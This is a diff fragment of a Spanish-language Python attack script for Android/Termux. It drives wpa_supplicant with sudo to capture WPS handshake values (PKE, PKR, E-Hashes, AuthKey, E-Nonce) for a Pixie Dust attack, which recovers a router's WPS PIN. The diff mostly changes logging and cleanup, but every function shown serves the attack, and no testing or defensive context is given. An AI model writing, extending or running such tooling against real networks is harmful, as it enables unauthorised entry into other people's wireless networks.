@@ -65,17 +65,17 @@ network={{
 
 def capture_wps_data(interface, ssid):
     """Captura los datos necesarios para el ataque Pixie Dust usando wpa_supplicant"""
-    print(f"Capturando datos WPS de la red con SSID '{ssid}'...")
+    print(f"Capturando datos WPS de la red con SSID {ssid}...")
     conf_file = create_wpa_supplicant_conf(ssid)
-    wpa_supplicant_path = "/data/data/com.termux/files/usr/bin/wpa_supplicant"
+    wpa_supplicant_path = "/data/data/com.termux/files/usr/bin/wpa_supplicant"  # Ruta completa de wpa_supplicant
     wpa_supplicant_command = f"{wpa_supplicant_path} -i {interface} -c {conf_file} -dd"
-
-    print(f"\nIniciando wpa_supplicant con el siguiente comando:\n{wpa_supplicant_command}")
+    print(f"Ejecutando wpa_supplicant: {wpa_supplicant_command}")
     stdout, stderr = run_command(wpa_supplicant_command, use_sudo=True)
-    
-    os.remove(conf_file)  # Eliminar el archivo de configuración temporal
 
-    # Extraer los valores necesarios
+    print("Salida de wpa_supplicant:")
+    print(stdout)
+    print(stderr)
+
     pke = extract_value(stdout, "PKE:")
     pkr = extract_value(stdout, "PKR:")
     ehash1 = extract_value(stdout, "E-Hash1:")
@@ -83,14 +83,7 @@ def capture_wps_data(interface, ssid):
     authkey = extract_value(stdout, "AuthKey:")
     enonce = extract_value(stdout, "E-Nonce:")
 
-    print("\n--- Datos capturados por wpa_supplicant ---")
-    print(f"PKE: {pke}")
-    print(f"PKR: {pkr}")
-    print(f"E-Hash1: {ehash1}")
-    print(f"E-Hash2: {ehash2}")
-    print(f"AuthKey: {authkey}")
-    print(f"E-Nonce: {enonce}")
-    print("------------------------------------------")
+    os.remove(conf_file)  # Eliminar el archivo de configuración temporal
 
     if not all([pke, pkr, ehash1, ehash2, authkey, enonce]):
         print("No se pudieron capturar todos los datos necesarios para el ataque Pixie Dust.")
@@ -99,7 +92,7 @@ def capture_wps_data(interface, ssid):
     return pke, pkr, ehash1, ehash2, authkey, enonce
 
 def perform_pixie_dust_attack(interface, ssid):
-    """Realiza el ataque Pixie Dust usando los datos capturados de wpa_supplicant"""
+    """Realiza el ataque Pixie Dust usando los datos de wpa_supplicant."""
     print(f"\nIniciando ataque Pixie Dust en SSID: {ssid}")
 
     # Capturar los datos necesarios usando wpa_supplicant
